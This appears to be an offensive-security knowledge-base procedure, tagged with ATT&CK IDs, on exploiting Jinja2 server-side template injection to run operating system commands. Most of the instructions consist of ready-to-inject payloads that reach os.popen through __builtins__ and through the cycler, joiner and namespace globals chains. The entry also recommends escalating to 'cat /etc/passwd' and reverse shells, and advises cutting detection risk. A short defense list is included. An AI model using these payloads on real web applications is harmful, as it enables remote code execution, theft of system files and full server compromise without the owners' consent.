---
type: procedure
description: >-
  Exploit Server Side Template Injection (SSTI) in Jinja2 templates to execute
  arbitrary operating system commands using os.popen().read().
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Indicator Removal on Host|T1070 - Indicator Removal on Host]]'
sub_techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/Command and Scripting
    Interpreter: Unix Shell|T1059.004 - Unix Shell]]
tags:
  - '[[tags/Jinja2]]'
  - '[[tags/Server Side Template Injection]]'
  - '[[tags/Jinja2 - Remote Code Execution]]'
  - '[[tags/Exploit the SSTI by calling os.popen().read()]]'
commands: []
platforms:
  - Web
  - Linux
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Jinja2-Server-Side-Template-Injection-with-os-popen-read

## Summary

This procedure demonstrates how to exploit Server Side Template Injection (SSTI) vulnerabilities in Jinja2 templating engine used in Python web applications. By injecting malicious templates that access the os module via __builtins__ and using os.popen().read(), attackers can execute arbitrary system commands on the server, leading to remote code execution (RCE) and potential full compromise.

## Description

Jinja2 is a widely used templating engine for Python-based web frameworks like Flask and Django. SSTI occurs when user input is unsafely rendered into templates without proper sanitization, allowing attackers to inject Jinja2 expressions enclosed in {{ }} delimiters. This procedure focuses on chaining attribute access to reach the os module and execute commands via os.popen().read(), which runs shell commands and captures their output. This technique bypasses common input filters by navigating the template context's globals and builtins. It is effective against applications where templates process user-controlled data, such as search fields, usernames, or dynamic content rendering. Successful exploitation grants command execution as the web server user, enabling data exfiltration, persistence, or lateral movement. Prerequisites include identifying a SSTI endpoint through fuzzing with payloads like {{7*7}} (expecting 49 as output).

## Requirements

1. Access to a web application using Jinja2 that renders user input in templates without autoescaping enabled.
2. Knowledge of a vulnerable input field (e.g., via Burp Suite or manual testing).
3. A proxy tool like Burp Suite to intercept and modify requests.
4. Basic understanding of Python internals for payload construction.

## Defense

Defensive measures and detection strategies:

- Enable Jinja2 autoescaping for all user-controlled inputs and use the |safe filter only when necessary.
- Implement strict input validation and sanitization to block template syntax like {{ }}.
- Use sandboxed environments or restrict template access to globals/builtins with extensions like jinja2-sandbox.
- Monitor server logs for anomalous command executions (e.g., via os.popen) and web application firewall (WAF) rules to detect SSTI patterns.
- Regularly audit and update dependencies to patch known Jinja2 vulnerabilities.

## Objectives

1. Confirm SSTI vulnerability by injecting and evaluating simple expressions.
2. Access Python builtins and os module to execute system commands.
3. Run arbitrary commands to gather system information or escalate access.
4. Achieve remote code execution leading to server compromise.

## Instructions

### Step 1: Confirm SSTI and Execute Basic Command

**Context**: Identify a vulnerable input field and inject a payload to import the os module via builtins, then execute a simple command like 'id' to verify RCE. This step tests direct access through the template's self context.

**Code** ([[codes/Jinja2-SSTI-Basic-os-popen-id]]):

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

> Inject this payload into the vulnerable template input (e.g., a search box or username field). Submit the request and observe the response for the output of the 'id' command, which displays the current user and group IDs. If successful, it confirms os.popen execution; failure may indicate filtered imports, requiring alternative chains.

### Step 2: Explore Builtins for Further Access

**Context**: If direct import is blocked, explore the __builtins__ namespace to understand available functions and plan payload chaining. This helps in constructing more evasive payloads.

**Code** ([[codes/Jinja2-Explore-Builtins]]):

```python
{{ __builtins__ }}
```

> Inject this to dump the builtins dictionary. The response should list available built-in functions like print, len, and import. Use this output to identify unrestricted paths to os or subprocess modules. If the response shows restricted access, pivot to context-based chains in subsequent steps.

### Step 3: Execute Commands via Template Context Objects

**Context**: Use Jinja2's internal context objects (cycler, joiner, namespace) to bypass restrictions on direct self access. Each object provides an alternative path to globals and os for command execution.

**Code** ([[codes/Jinja2-SSTI-Context-Cycler-Joiner-Namespace-os-popen-id]]):

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

> Submit this multi-line payload. The response will concatenate the 'id' outputs from each path. Success is indicated by repeated user ID information; use this if Step 1 fails due to context restrictions. Decision point: If one path works, refine payloads using only that chain to reduce detection risk.

### Step 4: Alternative Context Chain for Command Execution

**Context**: For environments with additional filters on _TemplateReference, use shorter context references like cycler directly. This executes the same 'id' command via multiple entry points for redundancy.

**Code** ([[codes/Jinja2-SSTI-Cycler-Joiner-Namespace-os-popen-id]]):

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

> Inject into the template input. Expect concatenated 'id' outputs in the response. This is a fallback if full context paths are blocked. Verify by checking for consistent user/group IDs; if successful, escalate to more destructive commands like 'cat /etc/passwd' or reverse shell payloads.
